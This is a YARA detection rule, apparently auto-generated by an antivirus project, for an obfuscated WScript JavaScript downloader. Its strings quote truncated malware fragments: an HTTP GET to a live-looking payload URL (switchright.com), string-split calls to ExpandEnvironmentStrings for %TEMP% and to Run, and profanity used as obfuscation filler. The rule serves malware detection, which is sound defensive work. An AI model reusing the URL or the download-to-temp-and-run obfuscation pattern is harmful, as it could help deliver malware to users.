rule sig_20160428_ebf7aaf3843c24bbff3e50b36a2d2148 {
  meta:
    description = "datamaliciousorder - file 20160428_ebf7aaf3843c24bbff3e50b36a2d2148.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c2e34b4dea1cfd52a6a25cfdd5039a0279b2c3a57433b0eb1945a469db3288f3"

  strings:
    $s1  = "CttEqtXhzKwdEdvXkbBwj[GodJzmSbySauRykWvoDsl](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function WpnPlaDzdJylNxdHlhAxl() {return VvpDokCpeWqiNhaIzdHqe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function OblRftIlrPvaImuJkpQvc(DlvAjjXrmZohEycGvwWpj){VvpDokCpeWqiNhaIzdHqe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return SmsPwqIveNlaVwvKwmBvy - YrmDmhJwlQsnEynQjxYdo;};" fullword ascii
    $s5  = "var VvpDokCpeWqiNhaIzdHqe = function QvzOcxNccCzxMszDpjWpf() {return JpqHfcXcxYgdByjPcyMuy[BqsNrjFawWcgSkaKmhTmm](\"WScript\"+\"" ascii
    $s6  = "var JpqHfcXcxYgdByjPcyMuy = this[\"WScript\"];" fullword ascii
    $s7  = "var VvpDokCpeWqiNhaIzdHqe = function QvzOcxNccCzxMszDpjWpf() {return JpqHfcXcxYgdByjPcyMuy[BqsNrjFawWcgSkaKmhTmm](\"WScript\"+\"" ascii
    $s8  = "function WpnPlaDzdJylNxdHlhAxl() {return VvpDokCpeWqiNhaIzdHqe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function OblRftIlrPvaImuJkpQvc(DlvAjjXrmZohEycGvwWpj){VvpDokCpeWqiNhaIzdHqe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function ScoQmjOioQtuVhaMplIkn(){return DhzHcxXcgNpsIwzWpaYgq + \"\";};" fullword ascii
    $s11 = "function QdjTvaDvwUjyEuhOcsKjd(SmsPwqIveNlaVwvKwmBvy, YrmDmhJwlQsnEynQjxYdo){NxtJcaEwaTbnDatQkpRcj = NxtJcaEwaTbnDatQkpRcj * 1; " ascii
    $s12 = "if (CttEqtXhzKwdEdvXkbBwj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "DfuEvxHlgTcyWspBquCwd = true;" fullword ascii
    $s14 = "var GrzCdyAhjXzzUzsVotZzv = false;" fullword ascii
    $s15 = "var DfuEvxHlgTcyWspBquCwd = false;" fullword ascii
    $s16 = "var WggOixYhqEdcKuoEbxFgu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function SsvPjdOdsTnmYkjLtnUmp()" fullword ascii
    $s18 = "GrzCdyAhjXzzUzsVotZzv = true; " fullword ascii
    $s19 = "var DnrJvgSxfGuuXeaExlHmo = false;" fullword ascii
    $s20 = "DnrJvgSxfGuuXeaExlHmo = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}